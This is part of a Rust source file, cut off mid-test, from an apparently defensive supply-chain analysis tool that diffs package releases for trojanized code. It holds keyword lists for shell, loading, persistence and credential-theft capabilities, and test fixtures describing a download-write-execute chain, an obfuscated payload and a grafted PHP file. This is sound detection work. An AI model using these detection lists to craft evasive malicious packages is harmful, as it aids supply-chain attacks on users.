/// Normalize only a version-bearing archive/package root for matching. A
/// literal `foo/bin/x` stays distinct from `bar/bin/x`; `foo-1.0/bin/x` and
/// `foo-1.1/bin/x` both become `foo/bin/x`. This is the same conservative
/// `Version::detect` + `clean_name` rule used by the filename header logic.
fn normalized_member_path(path: &str) -> String {
    if !path.contains("!!") {
        return path.to_string();
    }
    path.split("!!")
        .map(|member| {
            let Some((root, suffix)) = member.split_once('/') else {
                return member.to_string();
            };
            let root = if let Some(version) = Version::detect(root) {
                clean_name(root, Some(&version))
            } else if let Some(root) = git_snapshot_root(root) {
                root.to_string()
            } else {
                return member.to_string();
            };
            if root.is_empty() {
                member.to_string()
            } else {
                format!("{root}/{suffix}")
            }
        })
        .collect::<Vec<_>>()
        .join("!!")
}

/// Strip the abbreviated/full commit suffix used by Git hosting source
/// snapshots (`project-deadbee/…`). Requiring a normal Git hash length and at
/// least one hex letter avoids treating ordinary numeric directory suffixes as
/// commits; version-bearing roots are handled separately above.
fn git_snapshot_root(root: &str) -> Option<&str> {
    let (name, commit) = root.rsplit_once('-')?;
    (!name.is_empty()
        && (7..=40).contains(&commit.len())
        && commit.bytes().all(|byte| byte.is_ascii_hexdigit())
        && commit
            .bytes()
            .any(|byte| matches!(byte.to_ascii_lowercase(), b'a'..=b'f')))
    .then_some(name)
}

/// A diff path as the reader sees it: the archive member alone, with the
/// container prefix dropped. Borrowed, not copied — this sits inside per-file
/// and per-payload loops.
fn display_member_path(path: &str) -> &str {
    path.split_once("!!").map_or(path, |(_, member)| member)
}

/// The type cleave detected for a diff entry. `None` when the entry carries no
/// label or the label is one filefacts does not know — an unknown type is never
/// treated as evidence either way.
fn member_type(file: &FileDiffEntry) -> Option<filefacts::FileType> {
    file.file_type
        .as_deref()
        .and_then(filefacts::FileType::from_label)
}

/// The identity a changed file carries, unless it is filename-only. A name
/// merely derived from the path is not a publisher claim, and reading it as one
/// would turn every rename into identity drift.
fn meaningful_identity(file: &FileDiffEntry) -> Option<&cleave::types::IdentityDiff> {
    let identity = file.identity.as_ref()?;
    let filename_only = |side: &Option<filefacts::Identity>| {
        side.as_ref()
            .is_some_and(crate::rubric::filename_only_identity)
    };
    (!filename_only(&identity.old) && !filename_only(&identity.new)).then_some(identity)
}

/// Root claims first, then members alphabetically, capped at `cap` — a large
/// package must not drown out the artifact's own identity.
fn ranked(mut entries: Vec<(usize, String)>, cap: usize) -> Vec<String> {
    entries.sort_by(|a, b| a.0.cmp(&b.0).then(a.1.cmp(&b.1)));
    entries.truncate(cap);
    entries.into_iter().map(|(_, text)| text).collect()
}

/// Every identity claim an artifact carries, in a fixed field order, each value
/// tagged with how it was established — `verified` when a signature backs it,
/// `claimed` when only the metadata asserts it. The signer's own name rides
/// along with the trust verdict; an unsigned-but-trusted artifact reports the
/// verdict alone.
///
/// `include_version` is the only axis of variation between the two readings
/// below: a version bump is not identity drift, so the field-level diff drops
/// it, while the LLM payload — which describes an artifact rather than
/// comparing two — keeps it.
fn identity_claim_list(
    identity: &filefacts::Identity,
    include_version: bool,
) -> Vec<(&'static str, String)> {
    let mut claims = Vec::new();
    let mut add = |label: &'static str, claim: Option<&filefacts::Claim>| {
        let Some(claim) = claim else {
            return;
        };
        let value = crate::printable(&claim.value);
        if value.is_empty() {
            return;
        }
        let provenance = if claim.verified {
            "verified"
        } else {
            "claimed"
        };
        claims.push((label, format!("{value} [{provenance}]")));
    };
    add("name", identity.name.as_ref());
    add("title", identity.title.as_ref());
    add("project", identity.project.as_ref());
    add("identifier", identity.identifier.as_ref());
    if include_version {
        add("version", identity.version.as_ref());
    }
    add("organization", identity.organization.as_ref());
    add("producer", identity.producer.as_ref());
    add("team", identity.team_id.as_ref());
    if let Some(signer) = &identity.signer {
        let signer_name = signer
            .organization
            .as_deref()
            .or(signer.common_name.as_deref())
            .unwrap_or_default();
        if !signer_name.is_empty() {
            claims.push((
                "signer",
                format!(
                    "{} [parsed, {}]",
                    crate::printable(signer_name),
                    trust_label(identity.trust)
                ),
            ));
        }
    } else if identity.trust != filefacts::Trust::Unsigned {
        claims.push(("trust", trust_label(identity.trust)));
    }
    claims
}

/// The claims as `field=value [provenance]` lines, for the LLM payload.
fn identity_claims(identity: &filefacts::Identity) -> Vec<String> {
    identity_claim_list(identity, true)
        .into_iter()
        .map(|(label, value)| format!("{label}={value}"))
        .collect()
}

/// The claims keyed by field, for a field-level terminal diff. Values retain
/// their trust marker so a claim becoming verified (or losing verification) is
/// visible even when its text did not change.
fn identity_claim_fields(
    identity: &filefacts::Identity,
    include_version: bool,
) -> BTreeMap<&'static str, String> {
    identity_claim_list(identity, include_version)
        .into_iter()
        .collect()
}

fn changed_identity_claims(
    path: &str,
    old: &BTreeMap<&'static str, String>,
    new: &BTreeMap<&'static str, String>,
) -> Vec<String> {
    let fields: std::collections::BTreeSet<&'static str> =
        old.keys().chain(new.keys()).copied().collect();
    fields
        .into_iter()
        .filter_map(|field| match (old.get(field), new.get(field)) {
            (Some(old), Some(new)) if old != new => {
                Some(format!("{path}: ~ {field} {old} → {new}"))
            }
            (Some(old), None) => Some(format!("{path}: − {field} {old}")),
            (None, Some(new)) => Some(format!("{path}: + {field} {new}")),
            _ => None,
        })
        .collect()
}

fn trust_label(trust: filefacts::Trust) -> String {
    format!("{trust:?}").to_ascii_lowercase()
}

fn add_capability_text(families: &mut HashSet<&'static str>, text: &str) {
    let lower = text.to_ascii_lowercase();
    let has = |terms: &[&str]| terms.iter().any(|term| lower.contains(term));
    if has(&[
        "communications/",
        "socket",
        "connect",
        "listen",
        "accept",
        "http",
        "websocket",
        "urlsession",
        "urlrequest",
        "network",
        "winhttp",
        "internetopen",
    ]) {
        families.insert("communications");
    }
    if has(&[
        "process/",
        "shell",
        "spawn",
        "execve",
        "createprocess",
        "nstask",
        "nspipe",
        "mkfifo",
        "/bin/sh",
        "fork",
    ]) {
        families.insert("process");
    }
    if has(&[
        "ssh",
        "identityfile",
        "stricthostkeychecking",
        "forwarding",
        "tunnelwithhostname",
        "remote-access",
    ]) {
        families.insert("remote-access");
    }
    if has(&[
        "discovery",
        "hardware",
        "iokit",
        "sysctl",
        "serial",
        "machine-id",
        "username",
        "nsusername",
        "getcomputername",
        "gethostname",
        "registry",
        "uname",
    ]) {
        families.insert("discovery");
    }
    if has(&[
        "crypto",
        "crypt",
        "aes",
        "hmac",
        "pbkdf",
        "sha",
        "md5",
        "bcrypt",
        "ncrypt",
        "pem-public-key",
    ]) {
        families.insert("crypto");
    }
    if has(&[
        "dylib/load",
        "dlopen",
        "dlsym",
        "loadlibrary",
        "getprocaddress",
        "ld_preload",
    ]) {
        families.insert("loading");
    }
    if has(&[
        "persistence",
        "launchd",
        "systemd",
        "cron",
        "runonce",
        "startup",
        "autostart",
        "service-install",
    ]) {
        families.insert("persistence");
    }
    if has(&[
        "archive",
        "encrypted-entry",
        "encoded-payload",
        "base64",
        "entropy",
        "packed",
        "compression",
    ]) {
        families.insert("concealment");
    }
    if has(&[
        "credential",
        "password",
        "browser",
        "keychain",
        "secret",
        "token",
    ]) {
        families.insert("credential-access");
    }
}

/// Recognize a focused remediation without trusting incident prose alone.
///
/// The joined shape requires a newly referenced artifact indicator, actual
/// file deletion, and at least two functions newly disabled by an immediate
/// entry return. The latter is executable evidence: it distinguishes a repair
/// that retains dead forensic code from an attacker merely claiming cleanup.
fn remediation_cleanup_context(
    old_root: &Path,
    new_root: &Path,
    a: &Assessment,
    judged_diff: &DiffReportV1,
    raw_diff: &DiffReportV1,
    risk: Option<crate::risk::Risk>,
) -> Option<Remediation> {
    let known_indicator = raw_diff.files.iter().any(|file| {
        file.scopes.traits.as_ref().is_some_and(|traits| {
            traits
                .added
                .iter()
                .chain(traits.changed.iter().map(|change| &change.new))
                .any(|finding| {
                    finding.id.ends_with("wp-comments-posts-reference")
                        || finding.id.ends_with("wp-comments-posts-masquerade")
                })
        })
    });
    // Last in the chain on purpose: it extracts every added or changed member
    // from *both* roots, and the cheap predicates ahead of it are false on
    // essentially every run.
    let compact_cleanup = known_indicator
        && has_new_class(a, "fs/delete")
        && judged_diff.summary.files_changed <= 4
        && judged_diff.summary.files_added <= 1
        && newly_disabled_source_functions(old_root, new_root, raw_diff) >= 2;
    // A fixed release often removes the malicious code instead of adding a
    // recognizable signature. A large same-package model-risk drop is strong
    // evidence of that remediation transition; the clean baseline→fixed
    // comparison does not have the drop and remains subject to normal gates.
    let model_recovery = risk.is_some_and(|r| r.old - r.new >= 0.50);
    if compact_cleanup {
        Some(Remediation::FocusedCleanup)
    } else if model_recovery {
        Some(Remediation::ModelRecovery)
    } else if attack_behavior_removed(judged_diff, a.new_severity()) {
        Some(Remediation::BehaviorRemoval)
    } else {
        None
    }
}

fn removed_high_risk_traits(diff: &DiffReportV1) -> Vec<&TraitChange> {
    let mut findings = diff
        .files
        .iter()
        .filter_map(|file| file.scopes.traits.as_ref())
        .flat_map(|traits| {
            traits.removed.iter().chain(
                traits
                    .changed
                    .iter()
                    .filter(|change| {
                        crate::rubric::crit_rank(change.old.crit)
                            > crate::rubric::crit_rank(change.new.crit)
                    })
                    .map(|change| &change.old),
            )
        })
        .filter(|finding| {
            matches!(
                finding.crit,
                cleave::Criticality::Suspicious | cleave::Criticality::Hostile
            )
        })
        .collect::<Vec<_>>();
    findings.sort_by(|a, b| a.id.cmp(&b.id));
    findings.dedup_by(|a, b| a.id == b.id);
    findings
}

fn attack_behavior_removed(diff: &DiffReportV1, new_severity: Severity) -> bool {
    if new_severity > Severity::Medium {
        return false;
    }
    let removed = removed_high_risk_traits(diff);
    removed
        .iter()
        .any(|finding| finding.crit == cleave::Criticality::Hostile)
        || removed.len() >= 2
}

/// Count functions newly made unreachable by a bare `return;` at entry.
/// This intentionally recognizes only the simple, unambiguous source form;
/// conditional returns and returns later in a body do not qualify.
fn newly_disabled_source_functions(old_root: &Path, new_root: &Path, diff: &DiffReportV1) -> usize {
    diff.files
        .iter()
        .filter(|file| matches!(file.status, FileStatus::Added | FileStatus::Changed))
        .map(|file| {
            let Some(new) = diff_source_bytes(new_root, &file.path)
                .as_deref()
                .map(immediate_entry_return_count)
            else {
                return 0;
            };
            let old = diff_source_bytes(old_root, &file.path)
                .as_deref()
                .map(immediate_entry_return_count);
            match (file.status, old) {
                // An added file has no base side, so everything it disables is
                // genuinely new.
                (FileStatus::Added, _) => new,
                (_, Some(old)) => new.saturating_sub(old),
                // A changed file whose base could not be read is *unknown*, not
                // empty. Counting `new` in full would manufacture the
                // remediation signal this feeds — and remediation is the
                // direction that lowers a verdict.
                (_, None) => 0,
            }
        })
        .sum()
}

fn diff_source_bytes(root: &Path, diff_path: &str) -> Option<Vec<u8>> {
    if let Some((_, member)) = diff_path.split_once("!!") {
        return cleave::extract_member(root, member).ok().flatten();
    }
    let path = if root.is_dir() {
        root.join(diff_path)
    } else {
        root.to_path_buf()
    };
    std::fs::read(path).ok()
}

fn immediate_entry_return_count(bytes: &[u8]) -> usize {
    if bytes.iter().take(8192).any(|byte| *byte == 0) {
        return 0;
    }
    let Ok(source) = std::str::from_utf8(bytes) else {
        return 0;
    };
    let lines = source.lines().collect::<Vec<_>>();
    lines
        .iter()
        .enumerate()
        .filter(|(_, line)| {
            let line = line.trim();
            line.contains("function ") && line.ends_with('{')
        })
        .filter(|(index, _)| {
            lines[index + 1..]
                .iter()
                .map(|line| line.trim())
                .find(|line| !line.is_empty() && !line.starts_with("//"))
                .is_some_and(|line| line == "return;")
        })
        .count()
}

#[cfg(test)]
mod tests {
    use std::collections::{BTreeMap, HashSet};
    use std::path::Path;

    use super::{
        CapabilityShape, add_capability_text, archive_member_candidates, attack_behavior_removed,
        binary_replacement_anomaly, capability_shape_score, changed_identity_claims,
        changed_test_carrier, clean_name, dependency_backed_public_api_anomaly,
        endgame_package_shape, executable_member_layout, external_remote_script_loader,
        identity_claim_fields, immediate_entry_return_count, is_compiled_binary_file_type,
        is_source_archive, line_diff, metric_change_importance, normalized_archive_diff,
        normalized_member_path, npm_snapshot_member_key, numeric_delta,
        obfuscated_remote_script_loader, opaque_runtime_payload_anomaly,
        python_distribution_member_key, removed_high_risk_traits, restored_endgame_package_shape,
        runtime_graft_anomaly, source_build_macro_score, source_download_write_execute_anomaly,
    };
    use crate::Severity;
    use crate::version::{Bump, BumpKind, Version};
    use cleave::Criticality;
    use cleave::types::{
        Changed, DiffReportV1, DiffSummary, FileDiffEntry, FileStatus, KvChange, MetricChange,
        ScopeDiff, ScopeDiffs, ScopeRocs, SectionChange, SymbolChange, TraitChange,
    };

    #[test]
    fn entry_return_detection_requires_an_unconditional_first_statement() {
        let source = br#"
            public function disabled() {
                return;
                dangerous_call();
            }
            function conditional() {
                if ($safe) return;
                dangerous_call();
            }
            function later() {
                setup();
                return;
            }
        "#;
        assert_eq!(immediate_entry_return_count(source), 1);
    }

    #[test]
    fn canonical_sdist_member_reinserts_archive_version_for_extraction() {
        assert_eq!(
            archive_member_candidates(
                Path::new("guardrails_ai-0.10.1-RECONSTRUCTED.tar.gz"),
                "guardrails_ai/guardrails/__init__.py"
            ),
            [
                "guardrails_ai/guardrails/__init__.py",
                "guardrails_ai-0.10.1/guardrails/__init__.py"
            ]
        );
        assert_eq!(
            archive_member_candidates(Path::new("package.tgz"), "package/index.js"),
            ["package/index.js"]
        );
    }

    #[test]
    fn auto_loaded_source_or_script_download_write_execute_chain_is_file_local() {
        let gained = |id: &str| TraitChange {
            id: id.to_string(),
            trait_section: "micro-behaviors".to_string(),
            crit: Criticality::Notable,
            conf: 1.0,
            desc: id.to_string(),
            count: 1,
        };
        let initializer = FileDiffEntry {
            path: "<root>!!pkg/pkg/__init__.py".to_string(),
            file_type: Some("python".to_string()),
            status: FileStatus::Changed,
            identity: None,
            scopes: ScopeDiffs {
                traits: Some(ScopeDiff {
                    added: vec![
                        gained(
                            "micro-behaviors/communications/http/lib/urllib::urlopen-response-body-read",
                        ),
                        gained("micro-behaviors/fs/write/file/direct::python-write-response-read"),
                        gained("micro-behaviors/process/create/subprocess::subprocess-api-call"),
                        gained(
                            "micro-behaviors/os/sysinfo/platform/runtime::python-platform-branch",
                        ),
                    ],
                    ..Default::default()
                }),
                ..Default::default()
            },
            old_formula: None,
            new_formula: None,
        };
        let report = |file: FileDiffEntry| DiffReportV1 {
            old_root: "old.tar.gz".to_string(),
            new_root: "new.tar.gz".to_string(),
            summary: DiffSummary {
                files_changed: 1,
                ..Default::default()
            },
            scopes: ScopeDiffs::default(),
            files: vec![file],
        };
        let patch = Some(Bump {
            kind: BumpKind::Patch,
            steps: 1,
        });
        let minor = Some(Bump {
            kind: BumpKind::Minor,
            steps: 1,
        });
        assert!(
            source_download_write_execute_anomaly(
                &report(initializer.clone()),
                patch,
                &HashSet::new()
            )
            .is_some()
        );
        assert!(
            source_download_write_execute_anomaly(
                &report(initializer.clone()),
                minor,
                &HashSet::new()
            )
            .is_none()
        );

        let mut ordinary_helper = initializer.clone();
        ordinary_helper.path = "<root>!!pkg/pkg/updater.py".to_string();
        assert!(
            source_download_write_execute_anomaly(&report(ordinary_helper), patch, &HashSet::new())
                .is_none()
        );

        let mut shell_entrypoint = initializer;
        shell_entrypoint.path = "<root>!!pkg/install.sh".to_string();
        shell_entrypoint.file_type = Some("shell".to_string());
        assert!(
            source_download_write_execute_anomaly(
                &report(shell_entrypoint),
                patch,
                &HashSet::from(["pkg/install.sh".to_string()]),
            )
            .is_some()
        );
    }

    #[test]
    fn patch_public_api_expansion_requires_floating_young_dependency() {
        let package = FileDiffEntry {
            path: "<root>!!package/package.json".to_string(),
            file_type: Some("package.json".to_string()),
            status: FileStatus::Changed,
            identity: None,
            scopes: ScopeDiffs {
                kv: Some(ScopeDiff {
                    added: vec![KvChange {
                        path: "dependencies.flatmap-stream".to_string(),
                        namespace: "dependencies".to_string(),
                        value: serde_json::Value::String("^0.1.0".to_string()),
                    }],
                    ..Default::default()
                }),
                ..Default::default()
            },
            old_formula: None,
            new_formula: None,
        };
        let entrypoint = FileDiffEntry {
            path: "<root>!!package/index.js".to_string(),
            file_type: Some("javascript".to_string()),
            status: FileStatus::Changed,
            identity: None,
            scopes: ScopeDiffs {
                symbols: Some(ScopeDiff {
                    added: vec![
                        SymbolChange {
                            symbol: "flatmap-stream".to_string(),
                            ..Default::default()
                        },
                        SymbolChange {
                            symbol: "exports.flatmap".to_string(),
                            ..Default::default()
                        },
                    ],
                    ..Default::default()
                }),
                ..Default::default()
            },
            old_formula: None,
            new_formula: None,
        };
        let report = |spec: &str| {
            let mut package = package.clone();
            package.scopes.kv.as_mut().unwrap().added[0].value =
                serde_json::Value::String(spec.to_string());
            DiffReportV1 {
                old_root: "old.tgz".to_string(),
                new_root: "new.tgz".to_string(),
                summary: DiffSummary {
                    files_changed: 2,
                    ..Default::default()
                },
                scopes: ScopeDiffs::default(),
                files: vec![package, entrypoint.clone()],
            }
        };
        let patch = Some(Bump {
            kind: BumpKind::Patch,
            steps: 1,
        });
        let minor = Some(Bump {
            kind: BumpKind::Minor,
            steps: 1,
        });
        let entrypoints = HashSet::from(["package/index.js".to_string()]);
        assert!(
            dependency_backed_public_api_anomaly(&report("^0.1.0"), patch, &entrypoints).is_some()
        );
        assert!(
            dependency_backed_public_api_anomaly(&report("0.1.0"), patch, &entrypoints).is_none()
        );
        assert!(
            dependency_backed_public_api_anomaly(&report("^0.1.0"), minor, &entrypoints).is_none()
        );
    }

    #[test]
    fn underscore_version_is_removed_cleanly_from_executable_name() {
        let version = Version::detect("ClassicShellSetup_4_3_0.exe").unwrap();
        assert_eq!(
            clean_name("ClassicShellSetup_4_3_0.exe", Some(&version)),
            "ClassicShellSetup.exe"
        );
    }

    #[test]
    fn same_version_binary_replacement_uses_file_type_and_cross_scope_metrics() {
        let metric = |path: &str, old: f64, new: f64| Changed {
            old: MetricChange {
                path: path.to_string(),
                value: serde_json::json!(old),
            },
            new: MetricChange {
                path: path.to_string(),
                value: serde_json::json!(new),
            },
        };
        let diff = DiffReportV1 {
            old_root: "old".to_string(),
            new_root: "new".to_string(),
            summary: DiffSummary {
                files_changed: 1,
                overall_roc: 0.70,
                scope_roc: ScopeRocs {
                    metrics: 0.40,
                    ..Default::default()
                },
                ..Default::default()
            },
            scopes: Default::default(),
            files: vec![FileDiffEntry {
                path: "payload.without-an-executable-extension".to_string(),
                file_type: Some("pe".to_string()),
                status: FileStatus::Changed,
                identity: None,
                scopes: ScopeDiffs {
                    metrics: Some(ScopeDiff {
                        changed: vec![
                            metric("binary.overlay_entropy", 7.4, 3.8),
                            metric("binary.is_pie", 1.0, 0.0),
                            metric("imports.count", 97.0, 31.0),
                            metric("sections.code_size", 50_176.0, 3_584.0),
                            metric("sections.count", 5.0, 13.0),
                        ],
                        ..Default::default()
                    }),
                    sections: Some(ScopeDiff {
                        added: vec![SectionChange::default()],
                        ..Default::default()
                    }),
                    symbols: Some(ScopeDiff {
                        removed: vec![SymbolChange::default()],
                        ..Default::default()
                    }),
                    ..Default::default()
                },
                old_formula: None,
                new_formula: None,
            }],
        };
        let same = Some(Bump {
            kind: BumpKind::Same,
            steps: 0,
        });
        assert!(binary_replacement_anomaly(&diff, same).is_some());

        let patch = Some(Bump {
            kind: BumpKind::Patch,
            steps: 1,
        });
        assert!(binary_replacement_anomaly(&diff, patch).is_none());

        let mut source = diff;
        source.files[0].file_type = Some("c".to_string());
        assert!(binary_replacement_anomaly(&source, same).is_none());
    }

    #[test]
    fn patch_runtime_entrypoint_to_opaque_added_source_uses_graph_and_metrics() {
        let added_metric = |path: &str, value: f64| MetricChange {
            path: path.to_string(),
            value: serde_json::json!(value),
        };
        let changed_metric = |path: &str, old: f64, new: f64| Changed {
            old: added_metric(path, old),
            new: added_metric(path, new),
        };
        let diff = DiffReportV1 {
            old_root: "old.tgz".to_string(),
            new_root: "new.tgz".to_string(),
            summary: DiffSummary {
                files_added: 1,
                files_changed: 2,
                overall_roc: 0.72,
                ..Default::default()
            },
            scopes: Default::default(),
            files: vec![
                FileDiffEntry {
                    path: "<root>".to_string(),
                    file_type: Some("npm".to_string()),
                    status: FileStatus::Changed,
                    identity: None,
                    scopes: ScopeDiffs {
                        metrics: Some(ScopeDiff {
                            changed: vec![changed_metric("file.size_bytes", 3_532.0, 6_803.0)],
                            ..Default::default()
                        }),
                        ..Default::default()
                    },
                    old_formula: None,
                    new_formula: None,
                },
                FileDiffEntry {
                    path: "<root>!!package/index.min.js".to_string(),
                    file_type: Some("javascript".to_string()),
                    status: FileStatus::Changed,
                    identity: None,
                    scopes: ScopeDiffs {
                        kv: Some(ScopeDiff {
                            added: vec![KvChange {
                                path: "source.strings[0]".to_string(),
                                namespace: "source".to_string(),
                                value: serde_json::json!("./test/data"),
                            }],
                            ..Default::default()
                        }),
                        ..Default::default()
                    },
                    old_formula: None,
                    new_formula: None,
                },
                FileDiffEntry {
                    path: "<root>!!package/test/data.js".to_string(),
                    file_type: Some("javascript".to_string()),
                    status: FileStatus::Added,
                    identity: None,
                    scopes: ScopeDiffs {
                        metrics: Some(ScopeDiff {
                            added: vec![
                                added_metric("file.size", 5_781.0),
                                added_metric("text.total_lines", 1.0),
                                added_metric("text.max_line_length", 5_781.0),
                                added_metric("text.encoded_string_ratio", 0.8),
                                added_metric("strings.max_length", 4_352.0),
                                added_metric("text.digit_ratio", 0.62),
                            ],
                            ..Default::default()
                        }),
                        ..Default::default()
                    },
                    old_formula: None,
                    new_formula: None,
                },
            ],
        };
        let patch = Some(Bump {
            kind: BumpKind::Patch,
            steps: 1,
        });
        let entrypoints = HashSet::from(["package/index.min.js".to_string()]);
        let anomaly = opaque_runtime_payload_anomaly(&diff, patch, &entrypoints).unwrap();
        assert_eq!(anomaly.payload, "<root>!!package/test/data.js");

        assert!(opaque_runtime_payload_anomaly(&diff, patch, &HashSet::new()).is_none());
        let minor = Some(Bump {
            kind: BumpKind::Minor,
            steps: 1,
        });
        assert!(opaque_runtime_payload_anomaly(&diff, minor, &entrypoints).is_none());
    }

    #[test]
    fn timestamp_clustered_runtime_graft_uses_identity_graph_and_raw_facts() {
        let kv = |path: &str, value: serde_json::Value| KvChange {
            path: path.to_string(),
            namespace: path.split('.').next().unwrap_or_default().to_string(),
            value,
        };
        let diff = DiffReportV1 {
            old_root: "old.zip".to_string(),
            new_root: "new.zip".to_string(),
            summary: DiffSummary {
                files_added: 1,
                files_changed: 2,
                overall_roc: 0.59,
                ..Default::default()
            },
            scopes: Default::default(),
            files: vec![
                FileDiffEntry {
                    path: "<root>".to_string(),
                    file_type: Some("zip".to_string()),
                    status: FileStatus::Changed,
                    identity: None,
                    scopes: ScopeDiffs {
                        kv: Some(ScopeDiff {
                            added: vec![
                                kv(
                                    "archive.timing.mtime_outlier_members[]",
                                    serde_json::json!("plugin/plugin.php"),
                                ),
                                kv(
                                    "archive.timing.mtime_outlier_members[]",
                                    serde_json::json!("plugin/payload.php"),
                                ),
                            ],
                            changed: vec![Changed {
                                old: kv(
                                    "archive.timing.mtime_spread_seconds",
                                    serde_json::json!(50_000),
                                ),
                                new: kv(
                                    "archive.timing.mtime_spread_seconds",
                                    serde_json::json!(100),
                                ),
                            }],
                            ..Default::default()
                        }),
                        ..Default::default()
                    },
                    old_formula: None,
                    new_formula: None,
                },
                FileDiffEntry {
                    path: "<root>!!plugin/plugin.php".to_string(),
                    file_type: Some("php".to_string()),
                    status: FileStatus::Changed,
                    identity: None,
                    scopes: ScopeDiffs {
                        kv: Some(ScopeDiff {
                            added: vec![kv("source.strings[0]", serde_json::json!("/payload.php"))],
                            ..Default::default()
                        }),
                        ..Default::default()
                    },
                    old_formula: None,
                    new_formula: None,
                },
                FileDiffEntry {
                    path: "<root>!!plugin/payload.php".to_string(),
                    file_type: Some("php".to_string()),
                    status: FileStatus::Added,
                    identity: None,
                    scopes: ScopeDiffs {
                        metrics: Some(ScopeDiff {
                            added: vec![MetricChange {
                                path: "file.size".to_string(),
                                value: serde_json::json!(1_518),
                            }],
                            ..Default::default()
                        }),
                        kv: Some(ScopeDiff {
                            added: vec![
                                kv(
                                    "source.strings[0]",
                                    serde_json::json!("https://example.invalid/pixel"),
                                ),
                                kv(
                                    "source.strings[1]",
                                    serde_json::json!("/runtime/system/file.php"),
                                ),
                            ],
                            ..Default::default()
                        }),
                        ..Default::default()
                    },
                    old_formula: None,
                    new_formula: None,
                },
            ],
        };
        let patch = Some(Bump {
            kind: BumpKind::Patch,
            steps: 1,
        });
        let entrypoints = HashSet::from(["plugin/plugin.php".to_string()]);
        assert!(runtime_graft_anomaly(&diff, patch, &entrypoints).is_some());

        let mut broad_timestamps = diff;
        broad_timestamps.files[0]
            .scopes
            .kv
            .as_mut()
            .unwrap()
            .changed[0]
            .new
            .value = serde_json::json!(10_000);
        assert!(runtime_graft_anomaly(&broad_timestamps, patch, &entrypoints).is_none());
    }

    #[test]
    fn numeric_feature_deltas_are_signed_and_safe_at_zero() {
        assert_eq!(
            numeric_delta(Some(10.0), Some(15.0)),
            (Some(5.0), Some(5.0), Some(0.5))
        );
        assert_eq!(
            numeric_delta(None, Some(15.0)),
            (Some(15.0), Some(15.0), None)
        );
        assert_eq!(
            numeric_delta(Some(15.0), None),
            (Some(-15.0), Some(15.0), None)
        );
        assert_eq!(
            numeric_delta(Some(0.0), Some(2.0)),
            (Some(2.0), Some(2.0), None)
        );
    }

    #[test]
    fn metric_ranking_does_not_treat_zero_to_one_as_infinite() {
        assert!(metric_change_importance(0.0, 6.0) > metric_change_importance(0.0, 1.0));
        assert!(metric_change_importance(100.0, 10.0) > metric_change_importance(0.0, 1.0));
    }

    #[test]
    fn attack_removal_requires_strong_disappearing_traits_and_no_replacement() {
        let finding = |id: &str, crit| TraitChange {
            id: id.to_string(),
            trait_section: "objectives".to_string(),
            crit,
            conf: 1.0,
            desc: id.to_string(),
            count: 1,
        };
        let make_diff = |removed| DiffReportV1 {
            old_root: "affected.tgz".to_string(),
            new_root: "fixed.tgz".to_string(),
            summary: DiffSummary::default(),
            scopes: ScopeDiffs::default(),
            files: vec![FileDiffEntry {
                path: "workflow.yml".to_string(),
                file_type: Some("yaml".to_string()),
                status: FileStatus::Changed,
                identity: None,
                scopes: ScopeDiffs {
                    traits: Some(ScopeDiff {
                        removed,
                        ..Default::default()
                    }),
                    ..Default::default()
                },
                old_formula: None,
                new_formula: None,
            }],
        };

        let hostile = make_diff(vec![finding(
            "objectives/supply-chain/trojanized/build-pipeline::encoded-shell",
            Criticality::Hostile,
        )]);
        assert_eq!(removed_high_risk_traits(&hostile).len(), 1);
        assert!(attack_behavior_removed(&hostile, Severity::Medium));
        assert!(!attack_behavior_removed(&hostile, Severity::High));

        let weak = make_diff(vec![finding(
            "objectives/anti-static/obfuscation::one-clue",
            Criticality::Suspicious,
        )]);
        assert!(!attack_behavior_removed(&weak, Severity::None));

        let joined = make_diff(vec![
            finding(
                "objectives/anti-static/obfuscation::encoded-shell",
                Criticality::Suspicious,
            ),
            finding(
                "objectives/supply-chain/trojanized/build-pipeline::oidc-shell",
                Criticality::Suspicious,
            ),
            finding(
                "micro-behaviors/process/create::ordinary-exec",
                Criticality::Notable,
            ),
        ]);
        assert_eq!(removed_high_risk_traits(&joined).len(), 2);
        assert!(attack_behavior_removed(&joined, Severity::None));
    }

    #[test]
    fn endgame_shape_requires_behavioral_collapse_not_just_cleanup() {
        let faker = DiffSummary {
            files_removed: 1_785,
            files_added: 0,
            files_changed: 2,
            overall_roc: 1.0,
            scope_roc: ScopeRocs {
                traits: 0.99,
                ..Default::default()
            },
            ..Default::default()
        };
        assert!(endgame_package_shape(&faker));

        let ordinary_cleanup = DiffSummary {
            scope_roc: ScopeRocs {
                traits: 0.20,
                ..Default::default()
            },
            ..faker
        };
        assert!(!endgame_package_shape(&ordinary_cleanup));
    }

    #[test]
    fn restoration_shape_requires_the_broken_entrypoint_to_be_repaired() {
        let removed_trait = |id: &str| TraitChange {
            id: id.to_string(),
            trait_section: "metadata".to_string(),
            crit: Criticality::Notable,
            conf: 1.0,
            desc: "declared entrypoint absent".to_string(),
            count: 1,
        };
        let make_diff = |id: &str| DiffReportV1 {
            old_root: "stripped.tgz".to_string(),
            new_root: "restored.tgz".to_string(),
            summary: DiffSummary {
                files_added: 1_785,
                files_changed: 2,
                overall_roc: 1.0,
                scope_roc: ScopeRocs {
                    traits: 0.99,
                    ..Default::default()
                },
                ..Default::default()
            },
            scopes: Default::default(),
            files: vec![FileDiffEntry {
                path: "<root>".to_string(),
                file_type: None,
                status: FileStatus::Changed,
                identity: None,
                scopes: ScopeDiffs {
                    traits: Some(ScopeDiff {
                        removed: vec![removed_trait(id)],
                        ..Default::default()
                    }),
                    ..Default::default()
                },
                old_formula: None,
                new_formula: None,
            }],
        };

        assert!(restored_endgame_package_shape(&make_diff(
            "metadata/package/manifest/entrypoint::npm-main-entrypoint-not-shipped"
        )));
        assert!(!restored_endgame_package_shape(&make_diff(
            "metadata/package/files::ordinary-tree-change"
        )));
    }

    #[test]
    fn obfuscated_remote_loader_requires_convergence_on_one_file() {
        let trait_change = |suffix: &str| TraitChange {
            id: format!("micro-behaviors/test::{suffix}"),
            trait_section: "micro-behaviors".to_string(),
            crit: Criticality::Notable,
            conf: 1.0,
            desc: suffix.to_string(),
            count: 1,
        };
        let make_diff = |ids: &[&str]| DiffReportV1 {
            old_root: "old.tgz".to_string(),
            new_root: "new.tgz".to_string(),
            summary: Default::default(),
            scopes: Default::default(),
            files: vec![FileDiffEntry {
                path: "<root>!!package/browser.js".to_string(),
                file_type: Some("javascript".to_string()),
                status: FileStatus::Changed,
                identity: None,
                scopes: ScopeDiffs {
                    traits: Some(ScopeDiff {
                        added: ids.iter().map(|id| trait_change(id)).collect(),
                        ..Default::default()
                    }),
                    ..Default::default()
                },
                old_formula: None,
                new_formula: None,
